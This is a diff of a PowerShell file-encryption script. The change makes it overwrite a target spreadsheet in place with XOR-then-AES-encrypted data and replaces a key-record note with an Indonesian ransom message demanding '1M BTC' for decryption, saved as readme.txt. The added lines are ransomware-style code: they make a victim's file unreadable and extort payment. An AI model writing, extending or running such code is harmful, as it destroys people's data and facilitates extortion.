@@ -43,20 +43,13 @@ if (Test-Path $target) {
         
         $encrypted = AES-Encrypt -data $xored -pass $key
         
-        $outFile = $target + ".enc"
-        [IO.File]::WriteAllBytes($outFile, $encrypted)
-        Remove-Item $target -Force
+        [IO.File]::WriteAllBytes($target, $encrypted)
         
-        Write-Host "Done. File encrypted: $outFile"
+        Write-Host "Done. File encrypted (overwritten): $target"
         Write-Host "Key: $key | XOR: 0x7D"
         
         @"
-File: Pembekalan LKS.xlsx.enc
-Encryption: XOR (0x7D) -> AES-256-CBC
-Key: $key
-PBKDF2 iterations: 10000
-
-Simpan info ini baik-baik.
+HEHEH KAMU BAYAR 1M BTC BARU KU DECRIPT
 "@ | Out-File "E:\myyyykiisaahhhhh\readme.txt"
         
     } catch {
